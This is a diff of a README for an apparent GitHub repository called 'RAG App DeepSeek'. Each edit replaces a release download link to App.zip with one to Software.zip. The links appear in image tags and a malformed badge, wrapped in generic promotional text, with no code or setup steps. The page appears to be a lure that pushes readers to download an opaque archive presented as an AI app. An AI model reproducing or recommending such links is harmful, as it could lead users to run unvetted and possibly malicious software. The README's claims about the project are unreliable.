@@ -1,6 +1,6 @@
 # 🚀 Welcome to the RAG App DeepSeek Repository! 🤖
 
-![RAG App DeepSeek](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v1.0/App.zip)
+![RAG App DeepSeek](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v2.0/Software.zip)
 
 ## Repository: rag-app-deepseek
 
@@ -26,9 +26,9 @@ Welcome to the RAG App DeepSeek, a revolutionary Retrieval-Augmented Generation 
 "ai, deepseek-r1, fastapi, kafka, llm, machine-learning, milvus, ollama, python, rag, semantic-search, text-embeddings, vector-database".
 
 ### Check it out!
-[Download now!](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v1.0/App.zip)
+[Download now!](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v2.0/Software.zip)
 
-[![Download](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v1.0/App.zip%20now!-blue)](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v1.0/App.zip)
+[![Download](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v2.0/Software.zip%20now!-blue)](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v2.0/Software.zip)
 
 ### Overview
 Our RAG App DeepSeek is an innovative AI application that brings together the best of retrieval-based and generative models. By leveraging advanced technologies such as LLM (Large Language Models), Milvus for vector database management, and Python for seamless integration, DeepSeek sets a new standard in AI-driven responses.
@@ -55,4 +55,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for visiting the RAG App DeepSeek repository! 🌟 Start exploring the future of AI generation today. 🚀
 
-![RAG App DeepSeek](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v1.0/App.zip)
+![RAG App DeepSeek](https://github.com/Ivxn0902/rag-app-deepseek/releases/download/v2.0/Software.zip)
